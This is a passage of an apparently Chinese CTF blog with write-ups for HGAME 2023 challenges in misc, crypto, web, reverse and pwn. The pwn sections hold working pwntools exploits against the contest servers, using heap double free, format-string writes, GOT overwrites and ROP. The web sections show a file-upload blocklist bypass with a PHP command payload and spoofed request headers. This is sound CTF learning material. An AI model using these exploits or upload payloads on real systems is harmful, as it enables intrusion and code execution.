p64(stack_addr-224+2)+p64(stack_addr-224)r.send(pl)r.recvline()r.sendline(&#x27;n&#x27;)pl = &#x27;%&#x27;+str((ogg&gt;&gt;16)&amp;0xff)+&#x27;c%8$hhn&#x27;+&#x27;%&#x27;+str((ogg&amp;0xffff)-((ogg&gt;&gt;16)&amp;0xff))+&#x27;c%9$hn&#x27;r.send(pl)r.interactive() ​ fast_notelibc 2.23 UAF，泄露 __malloc_hook() 地址求得libc基地址，double free后使用 realloc() 调试，使得满足one_gadget条件即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *r = remote(&#x27;week-2.hgame.lwsec.cn&#x27;,31341)libc = ELF(&quot;libc-2.23.so&quot;)def add(ind,size,content): r.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Index: &#x27;,str(ind)) r.sendlineafter(&#x27;Size: &#x27;,str(size)) r.sendafter(&#x27;Content: &#x27;,content) def free(ind): r.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Index: &#x27;,str(ind))def show(ind): r.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Index: &#x27;,str(ind))add(0,0x80,&#x27;a&#x27;*0x80)add(1,0x80,&#x27;b&#x27;*0x80)free(0)show(0)malloc_hook = u64(r.recv(6)+&#x27;\\x00&#x27;*2)-104libc_base = malloc_hook - libc.sym.__malloc_hookprint(hex(libc_base))add(2,0x80,&#x27;a&#x27;*0x80)add(3,0x60,&#x27;c&#x27;*0x60)add(4,0x60,&#x27;d&#x27;*0x60)add(5,0x60,&#x27;e&#x27;*0x60)free(3)free(4)free(3)add(6,0x60,p64(malloc_hook-0x23))add(7,0x60,&#x27;f&#x27;*0x60)add(8,0x60,&#x27;f&#x27;*0x60)ogg = libc_base + 0xf1247realloc = libc_base + libc.sym.reallocprint(hex(realloc))add(9,0x60,&#x27;\\x00&#x27;*0xb+p64(ogg)+p64(realloc+0x6))r.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)r.sendlineafter(&#x27;Index: &#x27;,&#x27;10&#x27;)r.sendlineafter(&#x27;Size: &#x27;,&#x27;20&#x27;)r.interactive() ​ IotPirated router 兔兔在回家的火车上,看到一个神秘的0tatoP在卖路由器,于是兔兔买了一个回家过年,但是这个路由器咋总感觉怪怪的 路由器bin固件文件，参考提取路由器固件中的squashfs文件系统unsquashfs提取方法，提取路由器固件中的squashfs。 安装squashfs后，使用binwalk分离bin文件：binwalk -e AC10086W_FW_1.1.4.5.bin，生成文件夹 squashfs-root，其中的squashfs文件，修改文件头为 hsqs。 利用 firmware-mod-kit 解包squashfs文件：unsquashfs 1.squashfs，在 /bin 目录中发现一个文件名比较特别的程序 secret_program，使用IDA查看逻辑，main() 函数中： 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; _OWORD v4[8]; // [xsp+10h] [xbp+10h] int v5; // [xsp+90h] [xbp+90h] unsigned int v6; // [xsp+98h] [xbp+98h] int i; // [xsp+9Ch] [xbp+9Ch] v4[0] = unk_4543B0; v4[1] = unk_4543C0; v4[2] = unk_4543D0; v4[3] = unk_4543E0; v4[4] = unk_4543F0; v4[5] = unk_454400; v4[6] = unk_454410; v4[7] = unk_454420; v5 = 94; v6 = 35; for ( i = 0; i &lt;= 32; ++i ) printf(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6); return 0;&#125; 提取数据，简单异或操作还原： 12345s = [75, 68, 66, 78, 70, 88, 86, 77, 83, 23, 64, 72, 18, 77, 68, 124, 69, 74, 81, 78, 84, 66, 81, 70, 124, 18, 80, 124, 16, 98, 80, 90, 94]ss = [k^35 for k in s]print(bytes(ss))# b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 1","slug":"match-HGAME-2023-Week-1","date":"2023-01-11T10:51:02.000Z","updated":"2023-01-13T10:19:10.014Z","comments":true,"path":"2023/01/11/match-HGAME-2023-Week-1/","permalink":"https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/","excerpt":"","text":"​ HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)线上赛平台：https://hgame.vidar.club请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址比赛奖金(针对校外榜)：第1名：1000Pwnhub金币第2名：800Pwnhub金币第3名：600Pwnhub金币4-10名：300Pwnhub金币补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个注意：* 所有选手均以个人为单位参赛；* 在解题过程中遇到瓶颈或困难可以私聊出题人* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。* 每周比赛结束后本周前20名需提交wp到指定邮箱本比赛最终解释权归 Vidar-Team 所有 Rank: 1 ​ MiscSign In 欢迎参加HGAME2023,Base64解码这段Flag，然后和兔兔一起开始你的HGAME之旅吧，祝你玩的愉快！ aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ== 签到，base64解码，flag：hgame&#123;Welcome_To_HGAME2023!&#125;。 ​ Where am I 兔兔回家之前去了一个神秘的地方，并拍了张照上传到网盘，你知道他去了哪里吗？ flag格式为: hgame&#123;经度时_经度分_经度秒_东经(E)/西经(W)_纬度时_纬度分_纬度秒_南纬(S)/北纬(N)&#125;，秒精确到小数点后两位 例如: 11°22’33.99’’E, 44°55’11.00’’S 表示为 hgame{11_22_3399_E_44_55_1100_S} wireshark打开流量文件，在TCP流15提取rar文件； 16进制下查看rar文件，查看第24个16进制数为24，修改为 20 去除伪加密，解压得到 Exchangeable.jpg； 查看jpg文件属性，发现GPS经纬度信息，提取经纬度数据按格式得到flag：hgame&#123;116_24_1488_E_39_54_5418_N&#125;。 ​ 神秘的海报 坐车回到家的兔兔听说ek1ng在HGAME的海报中隐藏了一个秘密……（还记得我们的Misc培训吗？ zsteg查看png图片，发现在 b1,rgb,lsb,xy 存在lsb隐写内容： 12Sure enough, you still remember what we talked about at that time! This is part of the secret: `hgame&#123;U_Kn0w_LSB&amp;W`I put the rest of the content here, https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing, if you directly access the google drive cloud disk download in China, it will be very slow, you can try to use Scientific Internet access solves the problem of slow or inaccessible access to external network resources. This is my favorite music, there is another part of the secret in the music, I use Steghide to encrypt, the password is also the 6-digit password we agreed at the time, even if someone else finds out here, it should not be so easy to crack (( hope so 得到flag前半部分 hgame&#123;U_Kn0w_LSB&amp;W。 到google云盘下载 Bossanova.wav 文件，根据上面文字提示 I use Steghide to encrypt, the password is also the 6-digit password，使用了 Steghide 工具用6位数字密码隐写信息，爆破密码提取信息： stegseek Bossanova.wav rockyou.txt 解出密码为 123456，隐写内容：恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！ flag：hgame&#123;U_Kn0w_LSB&amp;Wav^Mp3_Stego&#125; ​ e99p1ant_want_girlfriend 兔兔在抢票网站上看到了一则相亲广告，人还有点小帅，但这个图片似乎有点问题，好像是CRC校验不太正确？ 16进制下修改png图片的高为更大的值，发现flag：hgame&#123;e99p1ant_want_a_girlfriend_qq_524306184&#125;。 ​ Crypto兔兔的车票 兔兔刚买到车票就把车票丢到一旁，自己忙去了。结果再去找车票时发现原来的车票混在了其他东西里，而且票面还被污染了。你能帮兔兔找到它的车票吗。 注：flag.png已经提前保存在source文件夹下，并且命名为picture{x}.png 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(&#x27;flag.png&#x27;)width = flagImg.widthheight = flagImg.heightdef makeSourceImg(): colors = long_to_bytes(getrandbits(width * height * 24))[::-1] img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgdef xorImg(keyImg, sourceImg): img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return img&quot;&quot;&quot;source文件夹下面的图片生成过程：def makeImg(): colors = list(long_to_bytes(getrandbits(width * height * 23)).zfill(width * height * 24)) shuffle(colors) colors = bytes(colors) img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgfor i in range(15): im = makeImg() im.save(f&quot;./source/picture&#123;i&#125;.png&quot;)&quot;&quot;&quot;n1 = makeSourceImg()n2 = makeSourceImg()n3 = makeSourceImg()nonce = [n1, n2, n3]index = list(range(16))shuffle(index)e=0&quot;&quot;&quot;这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png&quot;&quot;&quot;for i in index: im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;) key = nonce[randint(0, 2)] encImg = xorImg(key, im) encImg.save(f&#x27;pics/enc&#123;e&#125;.png&#x27;) e+=1 15张随机明文图片 $P_{m_k},k \\in [1,15]$ 与1张flag图片 $P_f$，经过3张密钥图片 $P_k,k \\in [1,3]$ 随机异或得到密文图片 $P_{c_k}, k \\in [1,16]$，在随机生成明文图片的 makeImg() 函数中有概率生成像素为 (0,0,0) 的点，这些点在随机异或操作后，密文图片与密钥图片对应的该点像素值相同，则有： flag图片对应的密文图片：$P_{c_f}(x,y) = P_{f}(x,y) \\oplus P_{k_a}(x,y)$ 非flag随机明文图片对应的密文图片： $P_{c_i}(x,y) = P_{m_i}(x,y) \\oplus P_{k_b}(x,y)$， 当满足 $a=b$ 时，即找到使用相同密钥图片加密的两组原始图片，有 $P_{k_a}(x,y)=P_{k_b}(x,y)$， 则 $P_{c_f}(x,y) \\oplus P_{c_i}(x,y) = P_{f}(x,y) \\oplus P_{m_i}(x,y)$； 又有大部分随机明文图片的点的像素值为 (0,0,0)，即 $P_{m_i}(x_0,y_0)=0$，则 $P_{c_f}(x_0,y_0) \\oplus P_{c_i}(x_0,y_0) = P_{f}(x_0,y_0) \\oplus P_{m_i}(x_0,y_0)=P_{f}(x_0,y_0)$ 有很大概率可以恢复flag图片。 只需找到满足 $a=b$ 的使用相同密钥图片加密的两组原始图片即可，通过爆破遍历。 123456789101112131415161718from PIL import Imagewidth = 379height = 234def xorImg(keyImg, sourceImg): img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgfor i in range(16): for j in range(16): img1 = Image.open(f&#x27;pics/enc&#123;i&#125;.png&#x27;) img2 = Image.open(f&#x27;pics/enc&#123;j&#125;.png&#x27;) img = xorImg(img1, img2) img.save(f&#x27;out/img_&#123;i&#125;_&#123;j&#125;.png&#x27;) 得到还原的flag图片，flag：hgame&#123;Oh_my_Ticket&#125;。 ​ RSA 众所周知，RSA的安全性基于整数分解难题。 1234567891011121314151617from Crypto.Util.number import *flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()p = getPrime(512)q = getPrime(512)n=p*qe = 65537m = bytes_to_long(flag)c = pow(m, e, n)print(f&quot;c=&#123;c&#125;&quot;)print(f&quot;n=&#123;n&#125;&quot;)&quot;&quot;&quot;c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789&quot;&quot;&quot; $n$ 分解出 $p,q$，常规RSA。 123456789101112p = 11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813q = 12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953n = p*qc = 110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582e = 65537f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# hgame&#123;factordb.com_is_strong!&#125; ​ Be Stream 很喜欢李小龙先生的一句话”Be water my friend”，但是这条小溪的水好像太多了。 1234567891011121314151617181920from flag import flagassert type(flag) == byteskey = [int.from_bytes(b&quot;Be water&quot;, &#x27;big&#x27;), int.from_bytes(b&quot;my friend&quot;, &#x27;big&#x27;)]def stream(i): if i==0: return key[0] elif i==1: return key[1] else: return (stream(i-2)*7 + stream(i-1)*4)enc = b&quot;&quot;for i in range(len(flag)): water = stream((i//2)**6) % 256 enc += bytes([water ^ flag[i]])print(enc)# b&#x27;\\x1a\\x15\\x05\\t\\x17\\tu&quot;-\\x06lm\\x01-\\xc7\\xcc2\\x1eXA\\x1c\\x15\\xb7\\xdb\\x06\\x13\\xaf\\xa1-\\x0b\\xd4\\x91-\\x06\\x8b\\xd4-\\x1e\\xab\\xaa\\x15-\\xf0\\xed\\x1f\\x17\\x1bY&#x27; 递推关系等同于矩阵运算： $s_i=4s_{i-1}+7s_{i-2}\\Longrightarrow \\begin{bmatrix} s_i \\\\ s_{i-1} \\end{bmatrix}=\\begin{bmatrix} 4 &amp; 7 \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} s_{i-1} \\\\ s_{i-2} \\end{bmatrix}=\\begin{bmatrix} 4 &amp; 7 \\\\ 1 &amp; 0 \\end{bmatrix}^{i-1}\\begin{bmatrix} s_1 \\\\ s_0 \\end{bmatrix}$ 利用矩阵快速幂快速求值即可。 12345678910111213141516171819# Sageenc = list(b&#x27;\\x1a\\x15\\x05\\t\\x17\\tu&quot;-\\x06lm\\x01-\\xc7\\xcc2\\x1eXA\\x1c\\x15\\xb7\\xdb\\x06\\x13\\xaf\\xa1-\\x0b\\xd4\\x91-\\x06\\x8b\\xd4-\\x1e\\xab\\xaa\\x15-\\xf0\\xed\\x1f\\x17\\x1bY&#x27;)key = [int.from_bytes(b&quot;Be water&quot;, &#x27;big&#x27;), int.from_bytes(b&quot;my friend&quot;, &#x27;big&#x27;)]s0, s1 = keyM = matrix(Zmod(256), [[4,7],[1,0]])A = vector(Zmod(256), [s1,s0])def stream(x): return (M^(x-1)*A)[0]flag = []for i in range(len(enc)): water = stream((i//2)**6) flag += [(int(water) ^^ int(enc[i])) % 128] print(bytes(flag))# b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27; ​ 神秘的电话 学校突然放假了，tr0uble正在开开心心的收拾东西准备回家，但是手机铃声突然响起，tr0uble接起电话，但是只听到滴答滴答的声音。努力学习密码学的tr0uble一听就知道这是什么，于是马上记录下来并花了亿点时间成功破译了，但是怎么看这都不像是人能看懂的，还没等tr0uble反应过来，又一通电话打来，依然是滴答滴答的声音。tr0uble想到兔兔也在学习密码学，于是不负责任地把密文都交给了兔兔，兔兔收到密文后随便看了一眼就不屑地说”这么简单都不会？自己解去，别耽误我抢车票”。 flag为最后得到的结果套上hgame{}, flag中字母均为小写 txt文件中有提示： 几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。 从wav文件中手搓摩斯密码： ----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-. 解码：0223e_priibly__honwa_jmgh_fgkcqaoqtmfr 根据txt提示，字符串逆序 + 栅栏密码（18栏） 得到：rmocfhm_wo_ybipe2023_ril_hnajg_katfqqg 由 2023 猜测 ybipe 对应 hgame，尝试Vigenere密码，密钥 vidar，得到：welcome_to_hgame2023_and_enjoy_hacking flag：hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125; ​ WebClassic Childhood Game 兔兔最近迷上了一个纯前端实现的网页小游戏，但是好像有点难玩，快帮兔兔通关游戏！ js游戏，查看源码，在 /Res/Events.js 中找到关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function mota() &#123; var a = [&#x27;\\x59\\x55\\x64\\x6b\\x61\\x47\\x4a\\x58\\x56\\x6a\\x64\\x61\\x62\\x46\\x5a\\x31\\x59\\x6d\\x35\\x73\\x53\\x31\\x6c\\x59\\x57\\x6d\\x68\\x6a\\x4d\\x6b\\x35\\x35\\x59\\x56\\x68\\x43\\x4d\\x45\\x70\\x72\\x57\\x6a\\x46\\x69\\x62\\x54\\x55\\x31\\x56\\x46\\x52\\x43\\x4d\\x46\\x6c\\x56\\x59\\x7a\\x42\\x69\\x56\\x31\\x59\\x35&#x27;]; (function (b, e) &#123; var f = function (g) &#123; while (--g) &#123; b[&#x27;push&#x27;](b[&#x27;shift&#x27;]()); &#125; &#125;; f(++e); &#125;(a, 0x198)); var b = function (c, d) &#123; c = c - 0x0; var e = a[c]; if (b[&#x27;CFrzVf&#x27;] === undefined) &#123; (function () &#123; var g; try &#123; var i = Function(&#x27;return\\x20(function()\\x20&#x27; + &#x27;&#123;&#125;.constructor(\\x22return\\x20this\\x22)(\\x20)&#x27; + &#x27;);&#x27;); g = i(); &#125; catch (j) &#123; g = window; &#125; var h = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;; g[&#x27;atob&#x27;] || (g[&#x27;atob&#x27;] = function (k) &#123; var l = String(k)[&#x27;replace&#x27;](/=+$/, &#x27;&#x27;); var m = &#x27;&#x27;; for (var n = 0x0, o, p, q = 0x0; p = l[&#x27;charAt&#x27;](q++); ~p &amp;&amp; (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String[&#x27;fromCharCode&#x27;](0xff &amp; o &gt;&gt; (-0x2 * n &amp; 0x6)) : 0x0) &#123; p = h[&#x27;indexOf&#x27;](p); &#125; return m; &#125;); &#125;()); b[&#x27;fqlkGn&#x27;] = function (g) &#123; var h = atob(g); var j = []; for (var k = 0x0, l = h[&#x27;length&#x27;]; k &lt; l; k++) &#123; j += &#x27;%&#x27; + (&#x27;00&#x27; + h[&#x27;charCodeAt&#x27;](k)[&#x27;toString&#x27;](0x10))[&#x27;slice&#x27;](-0x2); &#125; return decodeURIComponent(j); &#125;; b[&#x27;iBPtNo&#x27;] = &#123;&#125;; b[&#x27;CFrzVf&#x27;] = !![]; &#125; var f = b[&#x27;iBPtNo&#x27;][c]; if (f === undefined) &#123; e = b[&#x27;fqlkGn&#x27;](e); b[&#x27;iBPtNo&#x27;][c] = e; &#125; else &#123; e = f; &#125; return e; &#125;; alert(atob(b(&#x27;\\x30\\x78\\x30&#x27;)));&#125; 在控制台中运行，弹窗内容即为flag：hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;。 ​ Become A Member 学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money…… 想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗 考察HTTP请求头中的User-Agent、Cookie、来源(Referer)和本地访问(X-Forwarded-For)。 需依次满足： 12345678User-Agent: Cute-BunnyCookie: code=VidarReferer: bunnybunnybunny.comX-Forwarded-For: 127.0.0.1JSONusername=luckytodaypassword=happy123 以JSON格式请求登录即可： 12345678910111213141516GET / HTTP/1.1Host: week-1.hgame.lwsec.cn:31450Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Cute-BunnyReferer: bunnybunnybunny.comX-Forwarded-For: 127.0.0.1Content-Type: application/jsonAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6Cookie: code=VidarConnection: closeContent-Length: 47&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125; 返回flag值：hgame&#123;H0w_ArE_Y0u_T0day?&#125;。 ​ Guess Who I Am 刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？ 查看源码： &lt;!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js --&gt; 访问发现为页面问题的答案，以list方式提取数据。 另在js文件中搜索发现页面的3个路由： 获取问题：/api/getQuestion，验证答案：/api/verifyAnswer，获取分数：/api/getScore。 python脚本模拟页面100次回答： 123456789101112131415161718192021222324data = [ &#123; &quot;id&quot;: &quot;ba1van4&quot;, &quot;intro&quot;: &quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;, &quot;avatar&quot;: &quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;, &quot;url&quot;: &quot;https://ba1van4.icu&quot; &#125;, ......]dic = &#123;&#125;for k in data: dic[k[&quot;intro&quot;]] = k[&quot;id&quot;]s = requests.Session()url = &#x27;http://week-1.hgame.lwsec.cn:xxxxx&#x27;for i in range(100): r = s.get(url+&#x27;/api/getQuestion&#x27;) intro = json.loads(r.text)[&quot;message&quot;] #print(intro) r = s.post(url+&#x27;/api/verifyAnswer&#x27;, data=&#123;&#x27;id&#x27;:dic[intro]&#125;) r = s.get(url+&#x27;/api/getScore&#x27;) print(r.text) 运行得到100次循环后的结果：&#123;&quot;message&quot;:&quot;hgame&#123;Guess_who_i_am^Happy_Crawler&#125;&quot;&#125;。 ​ Show Me Your Beauty 登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D 不过好像可以上传些奇怪后缀名的文件诶 XD 图片文件上传，抓包尝试，文件名存在关键字黑名单，包括 php/phtml/ini/htaccess 等； 测试发现可以大小写绕过，将文件名后缀修改为 Php，内容修改为 &lt;?=`cat /flag`;，上传 1.Php，访问即可得到flag：hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;。 ​ Reversetest your IDA 签到 IDA打开查看字符串有flag：hgame&#123;te5t_y0ur_IDA&#125;。 ​ easyasm 非常简单的汇编 关键操作在 xor eax, 33h，将结果异或0x33即可还原： 12345c = [0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]flag = [k^0x33 for k in c]print(bytes(flag))# b&#x27;hgame&#123;welc0me_t0_re_wor1d!&#125;&#x27; ​ easyenc easyenc 代码逻辑为逐字符先异或0x32后减86，逆向还原： 12345678910c = [4, 255, 253, 9, 1, 243, 176, 0, 0, 5, 240, 173, 7, 6, 23, 5, 235, 23, 253, 23, 234, 1, 238, 1, 234, 177, 5, 250, 8, 1, 23, 172, 236, 1, 234, 253, 240, 5, 7, 6, 249]flag = [((k+86)^0x32) &amp; 0xff for k in c]print(bytes(flag))# b&#x27;hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;&#x27; ​ a_cup_of_tea 兔兔的家人都爱喝茶，所以兔兔带了些茶叶回去 魔改了delta为 0xABCDEF23 的Tea算法，用解密算法还原： 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xABCDEF23 * 32 delta = 0xABCDEF23 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: c = [0x2E63829D, 0xC14E400F, 0x9B39BFB9, 0x5A1F8B14, 0x61886DDE, 0x6565C6CF, 0x9F064F64, 0x236A43F6, 0x7D6B] cc = [long_to_bytes(k)[::-1] for k in c] key = [0x12345678, 0x23456789, 0x34567890, 0x45678901] flag = b&#x27;&#x27; for i in range(len(c)//2): d = decrypt(c[2*i:2*(i+1)], key) flag += long_to_bytes(d[0])[::-1]+long_to_bytes(d[1])[::-1] flag += long_to_bytes(c[-1])[::-1] print(flag) # b&#x27;hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;&#x27; ​ encode 兔兔把自己行李箱的密码用一种编码写在了纸条上，但他忘了怎么解密，你能帮帮他吗？ 代码逻辑为将低4位和高4位分别取出存入 v4[2*i] 和 v4[2*i+1]，提取比对字符串 dword_403000，逆向还原： 123456789c = [8, 6, 7, 6, 1, 6, 13, 6, 5, 6, 11, 7, 5, 6, 14, 6, 3, 6, 15, 6, 4, 6, 5, 6, 15, 5, 9, 6, 3, 7, 15, 5, 5, 6, 1, 6, 3, 7, 9, 7, 15, 5, 6, 6, 15, 6, 2, 7, 15, 5, 1, 6, 15, 5, 2, 7, 5, 6, 6, 7, 5, 6, 2, 7, 3, 7, 5, 6, 15, 5, 5, 6, 14, 6, 7, 6, 9, 6, 14, 6, 5, 6, 5, 6, 2, 7, 13, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]flag = &#x27;&#x27;for i in range(len(c)//2): flag += chr((c[2*i+1] &lt;&lt; 4) + c[2*i])print(flag)# hgame&#123;encode_is_easy_for_a_reverse_engineer&#125; ​ Pwntest_ncpwn签到，直接 cat flag 得flag。 ​ easy_overflow简单栈溢出到 b4ckd0or() 函数上，特别的一点是用 close(1) 关闭了标准输出，可以用 execv 1&gt;&amp;0 将标准输出重定向到标准输入，因为默认打开一个终端后，0/1/2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了。 123456789from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31066)b4ckd0or=0x401176pl=&#x27;a&#x27;*(0x10+8)+p64(b4ckd0or)r.send(pl)r.interactive() ​ choose_the_seat 兔兔在买高铁票时想要选一个好座位。 HINTS: 数组下标的检查好像少了点东西 由代码逻辑知可以写入bss段，只限制了上限未限制下限，使用负数可打GOT表内容。覆盖 exit() 的GOT表为 main() 使程序循环，再覆盖 puts() 的GOT表泄露 puts() 地址计算得到libc基地址，最后覆盖 puts() 的GOT表为 system(&quot;/bin/sh\\x00&quot;)。 123456789101112131415161718192021222324252627282930from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30831)elf=ELF(&#x27;./vuln&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)main=elf.sym.mainr.recvuntil(&#x27;choose one.\\n&#x27;)r.sendline(&#x27;-6&#x27;)r.recvline()r.send(p64(main))r.recvuntil(&#x27;choose one.\\n&#x27;)r.sendline(&#x27;-9&#x27;)r.recvline()r.send(&#x27;a&#x27;*8)r.recvuntil(&#x27;a&#x27;*8)puts_addr=u64(r.recv(6)+&#x27;\\x00&#x27;*2)print(hex(puts_addr))base=puts_addr-libc.sym.putsprint(hex(base))r.recvuntil(&#x27;choose one.\\n&#x27;)r.sendline(&#x27;-9&#x27;)r.recvline()r.send(&#x27;/bin/sh\\x00&#x27;+p64(base+libc.sym.system))r.interactive() ​ orw HINTS: 标题就是考点捏，没思路的可以按照标题查一查 觉得溢出的不够多？那就先找个地方把ROP链写进去，再把栈迁移过去执行吧 标题表明需orw，但开启了沙盒禁用了 execve()/execveat()，read() 读的字节数足以用ROP链泄露libc，但溢出字节0x28不足以执行orw，需先做栈迁移后，再执行orw。 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30153)context(arch=&#x27;amd64&#x27;)elf=ELF(&#x27;./vuln&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)pop_rdi=0x401393ret=0x40101amain=elf.sym.mainputs_plt=elf.plt.putsputs_got=elf.got.putsr.recvline()pl=b&#x27;a&#x27;*(0x100+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(elf.sym.main)r.send(pl)leak=u64(r.recv(6)+b&#x27;\\x00&#x27;*2)print(hex(leak))base=leak-libc.sym.putsprint(hex(base))libc.address=basedef findGadget(gadget): return 